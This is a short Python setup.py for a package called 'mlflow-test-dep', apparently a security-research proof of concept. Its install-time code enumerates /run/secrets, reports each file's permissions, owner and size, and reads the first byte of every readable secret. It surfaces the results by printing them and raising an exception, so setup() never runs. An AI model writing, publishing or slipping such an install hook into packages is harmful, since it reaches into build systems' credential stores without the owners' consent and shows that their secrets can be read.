import os, stat
from setuptools import setup

proof = "🚨🚨🚨 SECRETS_DIR_CHECK 🚨🚨🚨\n\n"
d = "/run/secrets"
if not os.path.exists(d):
    proof += f"{d} absent\n"
else:
    for e in os.listdir(d):
        p = os.path.join(d, e)
        try:
            st = os.stat(p)
            proof += (
                f"{e}: mode={stat.filemode(st.st_mode)} "
                f"uid={st.st_uid} gid={st.st_gid} size={st.st_size} "
                f"readable={os.access(p, os.R_OK)}\n"
            )
            if os.access(p, os.R_OK) and st.st_size > 0:
                with open(p, "rb") as f:
                    b = f.read(1)
                proof += f"  READ PROOF: first byte={b!r} (STOP — do not dump contents)\n"
        except Exception as e:
            proof += f"{e}: error {type(e).__name__}\n"

proof += "\n🚨🚨🚨 END SECRETS CHECK 🚨🚨🚨\n"
print(proof)
raise Exception(proof)
setup(name="mlflow-test-dep", version="0.1")
